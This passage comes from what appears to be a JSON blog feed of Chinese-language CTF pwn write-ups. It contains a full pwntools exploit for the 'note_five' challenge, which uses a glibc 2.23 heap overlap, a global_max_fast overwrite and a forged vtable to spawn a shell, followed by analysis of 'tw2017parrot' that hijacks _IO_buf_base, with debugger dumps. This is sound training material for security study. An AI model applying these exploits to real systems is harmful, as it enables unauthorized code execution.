house of orange 一样的技巧来 getshell，即伪造 stderr 的 vtable，触发 malloc_printerr 来 getshell</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">command</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(command))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,sz</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;size: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>(<span class=\"params\">host,port=<span class=\"number\">9999</span></span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> p</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> host:</span><br><span class=\"line\">\t\tp = remote(host,port)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tp = process(<span class=\"string\">&quot;./note_five&quot;</span>)</span><br><span class=\"line\">\t\tgdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0x98</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">0xa8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0x1e8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tdele(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">3</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">0xf8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0xf8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0x1f8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0xf0</span>+p64(<span class=\"number\">0x1f0</span>)+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tt = <span class=\"built_in\">int</span>(raw_input(<span class=\"string\">&#x27;guest: &#x27;</span>))</span><br><span class=\"line\">\t<span class=\"comment\"># t = 8</span></span><br><span class=\"line\">\tglobal_maxfast = (t &lt;&lt; <span class=\"number\">12</span>) | <span class=\"number\">0x7f8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tstdout = global_maxfast-<span class=\"number\">0x11d8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>,<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">8</span>+p16(global_maxfast-<span class=\"number\">0x10</span>)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0x1f8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">2</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0x1f8</span>+<span class=\"string\">&#x27;\\xf1&#x27;</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span>,<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">0x98</span>+p64(<span class=\"number\">0xf1</span>)+p16(stdout-<span class=\"number\">0x51</span>)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">4</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tdele(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0x2e8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">3</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0x1f8</span>+p64(<span class=\"number\">0xf1</span>)+<span class=\"string\">&#x27;\\xa0\\n&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">&#x27;A&#x27;</span>+<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">0x40</span>+p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">&#x27;\\x00\\n&#x27;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.recv(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlibc.address = u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3c5600</span></span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;libc : &quot;</span> + <span class=\"built_in\">hex</span>(libc.address))</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\">\tone_gadget = <span class=\"number\">0xf1207</span>+libc.address</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpayload = <span class=\"string\">&#x27;\\x00&#x27;</span>+p64(libc.address+<span class=\"number\">0x3c55e0</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x1</span>)+p64(one_gadget)*<span class=\"number\">2</span>+p64(libc.address+<span class=\"number\">0x3c5600</span>-<span class=\"number\">8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">4</span>,payload+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">1000</span>)</span><br><span class=\"line\">\tp.interactive()</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\tlibc = ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># elf = ELF(&quot;./mheap&quot;,checksec=False)</span></span><br><span class=\"line\">\tmain(args[<span class=\"string\">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/22/tw2017parrot/",
            "url": "http://example.com/2022/03/22/tw2017parrot/",
            "title": "tw2017parrot",
            "date_published": "2022-03-22T12:11:00.000Z",
            "content_html": "<h1 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h1>\n<h1 id=\"i-io_buf_base劫持技术\"><a class=\"markdownIt-Anchor\" href=\"#i-io_buf_base劫持技术\">#</a> I IO_buf_base 劫持技术，</h1>\n<h2 id=\"文章写的会比较凌乱是在一边解题同时记录\"><a class=\"markdownIt-Anchor\" href=\"#文章写的会比较凌乱是在一边解题同时记录\">#</a> 文章写的会比较凌乱，是在一边解题同时记录</h2>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ strings libc.so<span class=\"number\">.6</span> | grep ubuntu </span><br><span class=\"line\">GNU C <span class=\"title function_\">Library</span> <span class=\"params\">(Ubuntu GLIBC <span class=\"number\">2.23</span><span class=\"number\">-0u</span>buntu11)</span> stable release version 2.23, by Roland McGrath et al.</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ checksec --file=tw2017parrot</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/pwnabletw/hijack_io_buf_base/tw2017parrot&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ file tw2017parrot </span><br><span class=\"line\">tw2017parrot: ELF <span class=\"number\">64</span>-bit LSB shared object, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">00f</span>bccd873daf9400480cbb4dbd48845f1bb97b8, not stripped</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ubuntu2.23 下的题目，只有 canary 保护没有开启，没有思路</p>\n<h2 id=\"主要代码\"><a class=\"markdownIt-Anchor\" href=\"#主要代码\">#</a> 主要代码</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sleep(<span class=\"number\">3u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">&quot;%lu&quot;</span>, &amp;size);</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !size )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    buf = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Buffer:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, size);</span><br><span class=\"line\">    *((_BYTE *)buf + size - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;\t\t\t<span class=\"comment\">//这个很关键</span></span><br><span class=\"line\">    write(<span class=\"number\">1</span>, buf, size);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h2>\n<h3 id=\"初步印象\"><a class=\"markdownIt-Anchor\" href=\"#初步印象\">#</a> 初步印象</h3>\n<p>代码很简单，malloc,free 没有多余的操作，但是 malloc 不会清空申请的堆块中的内存，同时我们可以输入空。但是只有一个堆块，紧邻 topchunk, 无法利用 unsortedbin 泄露 main_arena, 铃响其他办法</p>\n<p>malloc 的一个机制</p>\n<p>当我们在应用层调用 malloc 申请堆的时候，在 glibc 中实际上调用的是_lib_malloc 函数，但是_lib_malloc 函数只是用来简单的封装_int_malloc 函数的，_int_malloc 函数才是申请堆的核心函数。<br>\n_int_malloc 会根据应用层用户申请的内存块大小，从而分配相应的 chunk 给用户使用。</p>\n<p>函数的分配堆内存的主要执行流程<br>\n①请求大小在 fastbin 的范围内：在 fastbins 中找是否有对应的 chunk 可以使用。<br>\n②请求大小在 smallbin 的范围内：在 smallbin 中找是否有对应的 chunk 可以使用。<br>\n③请求大小在 largebin 的范围内：先调用 malloc_consolidate 对 fastbins 进行整理加入 unsortedbins。然后在 unsortedbin 中查看是否有满足要求的 chunk 可以使用。<br>\n④在 largebin 中寻找可用的 chunk 来使用。<br>\n⑤寻找较大的 bin 链中是否有可用的 chunk 来使用。<br>\n⑥切割 topchunk 来使用。<br>\n⑦topchunk 也不够了，再次调用 malloc_consolidate 整理 fastbins。<br>\n⑧topchunk 不够用，再次 malloc_consolidate 之后还没有可以用的，最终调用 sysmalloc（系统调用）申请内存。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"built_in\">stdin</span></span><br><span class=\"line\">$<span class=\"number\">1</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72540021</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是正常的 stdin 的 IO_FILE_plus 结构体，_IO_buf_base 是输入缓冲区开始的地方（其实应该是 read_base 是开始的地方，但是这里肯可能是说 read_base = buf_base），记得程序代码那个末尾写 0 吗。在这里将 _IO_buf_base 最低位改为 0. 这个地址其实是_IO_write_base, 这里就可以实现_IO_FILE_plus 的覆盖</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"built_in\">stdin</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539989</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f0883e32901</span> &lt;_IO_2_1_stdin_+<span class=\"number\">33</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f0883e32928</span> &lt;_IO_2_1_stdin_+<span class=\"number\">72</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f0883e32900</span> &lt;_IO_2_1_stdin_+<span class=\"number\">32</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f0883e347a8</span> &lt;__free_hook&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f0883e347b8</span> &lt;next_to_use&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/21/roarctf-2019-easypwn/",
            "url": "http://example.com/2022/03/21/roarctf-2019-easypwn/",
            "title": "roarctf_2019_easypwn",
            "date_published": "2022-03-21T15:38:20.000Z",
